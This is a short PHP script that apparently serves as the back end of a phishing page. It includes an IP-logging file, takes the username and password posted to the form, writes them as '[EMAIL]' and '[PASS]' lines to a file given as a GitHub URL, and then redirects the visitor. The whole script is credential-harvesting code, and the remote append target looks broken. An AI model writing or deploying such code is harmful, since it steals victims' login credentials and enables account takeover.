<?php
include 'ip.php';
$file = fopen("https://github.com/medha-mishra/medham.unimelb.life/blob/master/usernames.txt","a");
$content = "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n";
fwrite($file, $content);
header('Location: ');
exit();
